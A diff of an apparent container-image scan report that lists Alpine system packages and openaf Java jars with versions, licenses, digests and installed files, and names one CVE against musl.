-│     │                 │      │                ╰ [1]: lib/libc.musl-x86_64.so.1 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [21] ╭ ID            : musl-utils@1.2.5-r21 
-│     │                 │      ├ Name          : musl-utils 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/musl-utils@1.2.5-r21?arch=x86_64&distro=
-│     │                 │      │                │       3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 6f37302d99121f4f 
-│     │                 │      ├ Version       : 1.2.5-r21 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : musl 
-│     │                 │      ├ SrcVersion    : 1.2.5-r21 
-│     │                 │      ├ Licenses       ╭ [0]: MIT 
-│     │                 │      │                ├ [1]: BSD-2-Clause 
-│     │                 │      │                ╰ [2]: GPL-2.0-or-later 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: musl@1.2.5-r21 
-│     │                 │      │                ╰ [1]: scanelf@1.3.9-r0 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:793ce8115cfc734d044044e5a6b93cbce69bbb42 
-│     │                 │      ├ InstalledFiles ╭ [0]: sbin/ldconfig 
-│     │                 │      │                ├ [1]: usr/bin/getconf 
-│     │                 │      │                ├ [2]: usr/bin/getent 
-│     │                 │      │                ├ [3]: usr/bin/iconv 
-│     │                 │      │                ╰ [4]: usr/bin/ldd 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [22] ╭ ID            : nghttp2-libs@1.69.0-r0 
-│     │                 │      ├ Name          : nghttp2-libs 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/nghttp2-libs@1.69.0-r0?arch=x86_64&distr
-│     │                 │      │                │       o=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 4726dcfe565f1723 
-│     │                 │      ├ Version       : 1.69.0-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : nghttp2 
-│     │                 │      ├ SrcVersion    : 1.69.0-r0 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Francesco Colista <fcolista@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:5331b8c641f7a9091ce2f43dad2a99851c4f4b12 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libnghttp2.so.14 
-│     │                 │      │                ╰ [1]: usr/lib/libnghttp2.so.14.29.4 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [23] ╭ ID            : nginx@1.28.3-r0 
-│     │                 │      ├ Name          : nginx 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/nginx@1.28.3-r0?arch=x86_64&distro=3.24.
-│     │                 │      │                │       0_alpha20260127 
-│     │                 │      │                ╰ UID : 9293d8a31988fdb3 
-│     │                 │      ├ Version       : 1.28.3-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : nginx 
-│     │                 │      ├ SrcVersion    : 1.28.3-r0 
-│     │                 │      ├ Licenses       ─ [0]: BSD-2-Clause 
-│     │                 │      ├ Maintainer    : Jakub Jirutka <jakub@jirutka.cz> 
-│     │                 │      ├ DependsOn      ╭ [0]: busybox-binsh@1.37.0-r31 
-│     │                 │      │                ├ [1]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [2]: libssl3@3.5.6-r0 
-│     │                 │      │                ├ [3]: musl@1.2.5-r21 
-│     │                 │      │                ├ [4]: pcre2@10.47-r1 
-│     │                 │      │                ╰ [5]: zlib@1.3.1-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:81d1332d67c72d595e5628f2b696e22241e7178e 
-│     │                 │      ├ InstalledFiles ╭ [0] : etc/logrotate.d/nginx 
-│     │                 │      │                ├ [1] : etc/nginx/fastcgi.conf 
-│     │                 │      │                ├ [2] : etc/nginx/fastcgi_params 
-│     │                 │      │                ├ [3] : etc/nginx/mime.types 
-│     │                 │      │                ├ [4] : etc/nginx/nginx.conf 
-│     │                 │      │                ├ [5] : etc/nginx/scgi_params 
-│     │                 │      │                ├ [6] : etc/nginx/uwsgi_params 
-│     │                 │      │                ├ [7] : usr/sbin/nginx 
-│     │                 │      │                ├ [8] : usr/share/nginx/http-default_server.conf 
-│     │                 │      │                ├ [9] : var/lib/nginx/logs 
-│     │                 │      │                ├ [10]: var/lib/nginx/modules 
-│     │                 │      │                ├ [11]: var/lib/nginx/run 
-│     │                 │      │                ├ [12]: var/lib/nginx/html/50x.html 
-│     │                 │      │                ╰ [13]: var/lib/nginx/html/index.html 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [24] ╭ ID            : openssl@3.5.6-r0 
-│     │                 │      ├ Name          : openssl 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : baf9e061f1774138 
-│     │                 │      ├ Version       : 3.5.6-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : openssl 
-│     │                 │      ├ SrcVersion    : 3.5.6-r0 
-│     │                 │      ├ Licenses       ─ [0]: Apache-2.0 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [1]: libssl3@3.5.6-r0 
-│     │                 │      │                ╰ [2]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:9d9f5cdc53ba51ffd69d57d5fbfe45e123d643e1 
-│     │                 │      ├ InstalledFiles ─ [0]: usr/bin/openssl 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [25] ╭ ID            : pcre2@10.47-r1 
-│     │                 │      ├ Name          : pcre2 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/pcre2@10.47-r1?arch=x86_64&distro=3.24.0
-│     │                 │      │                │       _alpha20260127 
-│     │                 │      │                ╰ UID : a7638fac04ea13a0 
-│     │                 │      ├ Version       : 10.47-r1 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : pcre2 
-│     │                 │      ├ SrcVersion    : 10.47-r1 
-│     │                 │      ├ Licenses       ─ [0]: BSD-3-Clause 
-│     │                 │      ├ Maintainer    : Jakub Jirutka <jakub@jirutka.cz> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:8ad6119a4a26044922b96cd8e2fc82f36a256de8 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libpcre2-8.so.0 
-│     │                 │      │                ├ [1]: usr/lib/libpcre2-8.so.0.15.0 
-│     │                 │      │                ├ [2]: usr/lib/libpcre2-posix.so.3 
-│     │                 │      │                ╰ [3]: usr/lib/libpcre2-posix.so.3.0.7 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [26] ╭ ID            : scanelf@1.3.9-r0 
-│     │                 │      ├ Name          : scanelf 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/scanelf@1.3.9-r0?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : 31b55255afcd4737 
-│     │                 │      ├ Version       : 1.3.9-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : pax-utils 
-│     │                 │      ├ SrcVersion    : 1.3.9-r0 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:f91d557640d9e829bb650f8056edea0fc1e099cf 
-│     │                 │      ├ InstalledFiles ─ [0]: usr/bin/scanelf 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [27] ╭ ID            : ssl_client@1.37.0-r31 
-│     │                 │      ├ Name          : ssl_client 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/ssl_client@1.37.0-r31?arch=x86_64&distro
-│     │                 │      │                │       =3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : cda3227e33b46c14 
-│     │                 │      ├ Version       : 1.37.0-r31 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : busybox 
-│     │                 │      ├ SrcVersion    : 1.37.0-r31 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Sören Tempel <soeren+alpine@soeren-tempel.net> 
-│     │                 │      ├ DependsOn      ╭ [0]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [1]: libssl3@3.5.6-r0 
-│     │                 │      │                ╰ [2]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:6e8aec54788a34a67e76ecf2079e4b8e05704a05 
-│     │                 │      ├ InstalledFiles ─ [0]: usr/bin/ssl_client 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [28] ╭ ID            : sudo@1.9.17_p2-r1 
-│     │                 │      ├ Name          : sudo 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/sudo@1.9.17_p2-r1?arch=x86_64&distro=3.2
-│     │                 │      │                │       4.0_alpha20260127 
-│     │                 │      │                ╰ UID : ca7594332f0d5924 
-│     │                 │      ├ Version       : 1.9.17_p2-r1 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : sudo 
-│     │                 │      ├ SrcVersion    : 1.9.17_p2-r1 
-│     │                 │      ├ Licenses       ╭ [0]: custom 
-│     │                 │      │                ╰ [1]: ISC 
-│     │                 │      ├ Maintainer    : qaqland <qaq@qaq.land> 
-│     │                 │      ├ DependsOn      ╭ [0]: musl@1.2.5-r21 
-│     │                 │      │                ╰ [1]: zlib@1.3.1-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:237f40feff9ef853ce96d2247d1875522d5d1296 
-│     │                 │      ├ InstalledFiles ╭ [0] : etc/sudo.conf 
-│     │                 │      │                ├ [1] : etc/sudo_logsrvd.conf 
-│     │                 │      │                ├ [2] : etc/sudoers 
-│     │                 │      │                ├ [3] : usr/bin/cvtsudoers 
-│     │                 │      │                ├ [4] : usr/bin/sudo 
-│     │                 │      │                ├ [5] : usr/bin/sudoedit 
-│     │                 │      │                ├ [6] : usr/bin/sudoreplay 
-│     │                 │      │                ├ [7] : usr/lib/sudo/audit_json.so 
-│     │                 │      │                ├ [8] : usr/lib/sudo/group_file.so 
-│     │                 │      │                ├ [9] : usr/lib/sudo/libsudo_util.so 
-│     │                 │      │                ├ [10]: usr/lib/sudo/libsudo_util.so.0 
-│     │                 │      │                ├ [11]: usr/lib/sudo/libsudo_util.so.0.0.0 
-│     │                 │      │                ├ [12]: usr/lib/sudo/sudo_intercept.so 
-│     │                 │      │                ├ [13]: usr/lib/sudo/sudo_noexec.so 
-│     │                 │      │                ├ [14]: usr/lib/sudo/sudoers.so 
-│     │                 │      │                ├ [15]: usr/lib/sudo/system_group.so 
-│     │                 │      │                ├ [16]: usr/sbin/sudo_logsrvd 
-│     │                 │      │                ├ [17]: usr/sbin/sudo_sendlog 
-│     │                 │      │                ╰ [18]: usr/sbin/visudo 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [29] ╭ ID            : zlib@1.3.1-r2 
-│     │                 │      ├ Name          : zlib 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/zlib@1.3.1-r2?arch=x86_64&distro=3.24.0_
-│     │                 │      │                │       alpha20260127 
-│     │                 │      │                ╰ UID : c6f558cca1be2488 
-│     │                 │      ├ Version       : 1.3.1-r2 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : zlib 
-│     │                 │      ├ SrcVersion    : 1.3.1-r2 
-│     │                 │      ├ Licenses       ─ [0]: Zlib 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:7f6d1b44c82e08e09edc330137f50a408f87b6d6 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libz.so.1 
-│     │                 │      │                ╰ [1]: usr/lib/libz.so.1.3.1 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ╰ [30] ╭ ID            : zstd-libs@1.5.7-r2 
-│     │                        ├ Name          : zstd-libs 
-│     │                        ├ Identifier     ╭ PURL: pkg:apk/alpine/zstd-libs@1.5.7-r2?arch=x86_64&distro=3.
-│     │                        │                │       24.0_alpha20260127 
-│     │                        │                ╰ UID : 34f938e7b7878063 
-│     │                        ├ Version       : 1.5.7-r2 
-│     │                        ├ Arch          : x86_64 
-│     │                        ├ SrcName       : zstd 
-│     │                        ├ SrcVersion    : 1.5.7-r2 
-│     │                        ├ Licenses       ╭ [0]: BSD-3-Clause 
-│     │                        │                ╰ [1]: GPL-2.0-or-later 
-│     │                        ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                        ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                        ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                        │                │         edd8ebe468fc57d07e 
-│     │                        │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                        │                          961a5292bd158a4dcf 
-│     │                        ├ Digest        : sha1:43ac44ea9c46b340ba31d8f7fe10469f2d4223f4 
-│     │                        ├ InstalledFiles ╭ [0]: usr/lib/libzstd.so.1 
-│     │                        │                ╰ [1]: usr/lib/libzstd.so.1.5.7 
-│     │                        ╰ AnalyzedBy    : apk 
+│     ├ Packages        
 │     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-40200 
 │                       │     ├ PkgID           : musl@1.2.5-r21 
 │                       │     ├ PkgName         : musl 
@@ -1366,2780 +292,1573 @@
 ╰ [1] ╭ Target         : Java 
       ├ Class          : lang-pkgs 
       ├ Type           : jar 
-      ├ Packages        ╭ [0]   ╭ Name      : com.carrotsearch.thirdparty:simple-xml-safe 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.carrotsearch.thirdparty/simple-xml-safe@2.7.1 
-      │                 │       │            ╰ UID : 13b037b1fd5d66f 
-      │                 │       ├ Version   : 2.7.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/simple-xml-safe-2.7.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [1]   ╭ Name      : com.fasterxml.jackson.core:jackson-annotations 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-annotations@2
-      │                 │       │            │       .21 
-      │                 │       │            ╰ UID : a68585b707b894c6 
-      │                 │       ├ Version   : 2.21 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [2]   ╭ Name      : com.fasterxml.jackson.core:jackson-core 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1 
-      │                 │       │            ╰ UID : a0ae06e5352781bf 
-      │                 │       ├ Version   : 2.21.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [3]   ╭ Name      : com.fasterxml.jackson.core:jackson-databind 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1 
-      │                 │       │            ╰ UID : f5a07e107dd30f70 
-      │                 │       ├ Version   : 2.21.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [4]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-toml 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-datafor
-      │                 │       │            │       mat-toml@2.21.2 
-      │                 │       │            ╰ UID : 207de139b4c562ba 
-      │                 │       ├ Version   : 2.21.2 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [5]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-yaml 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-datafor
-      │                 │       │            │       mat-yaml@2.20.0 
-      │                 │       │            ╰ UID : 16f220ba7aa2c313 
-      │                 │       ├ Version   : 2.20.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/jackson-dataformat-yaml-2.20.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [6]   ╭ Name      : com.fasterxml.jackson.datatype:jackson-datatype-jsr310 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.datatype/jackson-datatype-
-      │                 │       │            │       jsr310@2.20.0 
-      │                 │       │            ╰ UID : d55714c89e63442b 
-      │                 │       ├ Version   : 2.20.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/jackson-datatype-jsr310-2.20.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [7]   ╭ Name      : com.github.mwiede:jsch 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.mwiede/jsch@2.28.0 
-      │                 │       │            ╰ UID : 98eb7bafeacbc106 
-      │                 │       ├ Version   : 2.28.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [8]   ╭ Name      : com.github.vertical-blank:sql-formatter 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.vertical-blank/sql-formatter@2.0.5 
-      │                 │       │            ╰ UID : b476ea318a48e65d 
-      │                 │       ├ Version   : 2.0.5 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [9]   ╭ Name      : com.google.code.gson:gson 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.code.gson/gson@2.13.2 
-      │                 │       │            ╰ UID : 55058bf256f684f6 
-      │                 │       ├ Version   : 2.13.2 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [10]  ╭ Name      : com.google.errorprone:error_prone_annotations 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.errorprone/error_prone_annotations@2.
-      │                 │       │            │       41.0 
-      │                 │       │            ╰ UID : eb9200afd679f03a 
-      │                 │       ├ Version   : 2.41.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/error_prone_annotations-2.41.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [11]  ╭ Name      : com.google.guava:failureaccess 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/failureaccess@1.0.3 
-      │                 │       │            ╰ UID : a4d08553078f3494 
-      │                 │       ├ Version   : 1.0.3 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/failureaccess-1.0.3.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [12]  ╭ Name      : com.google.guava:guava 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/guava@33.5.0-jre 
-      │                 │       │            ╰ UID : 1c289ba755aff307 
-      │                 │       ├ Version   : 33.5.0-jre 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/guava-33.5.0-jre.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [13]  ╭ Name      : com.google.guava:listenablefuture 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/listenablefuture@9999.0-empty-t
-      │                 │       │            │       o-avoid-conflict-with-guava 
-      │                 │       │            ╰ UID : dea9132e00506d46 
-      │                 │       ├ Version   : 9999.0-empty-to-avoid-conflict-with-guava 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/listenablefuture-9999.0-empty-to-avoid-conflict-with-gu
-      │                 │       │             ava.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [14]  ╭ Name      : com.google.j2objc:j2objc-annotations 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.j2objc/j2objc-annotations@3.1 
-      │                 │       │            ╰ UID : 33e5dd761cf08520 
-      │                 │       ├ Version   : 3.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/j2objc-annotations-3.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [15]  ╭ Name      : com.googlecode.juniversalchardet:juniversalchardet 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.googlecode.juniversalchardet/juniversalchard
-      │                 │       │            │       et@1.0.3 
-      │                 │       │            ╰ UID : 5447189855b6db87 
-      │                 │       ├ Version   : 1.0.3 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [16]  ╭ Name      : com.jcraft:jsch.agentproxy.connector-factory 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.connector-factory@0.0.9 
-      │                 │       │            ╰ UID : a99fffa9ec19f7cf 
-      │                 │       ├ Version   : 0.0.9 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
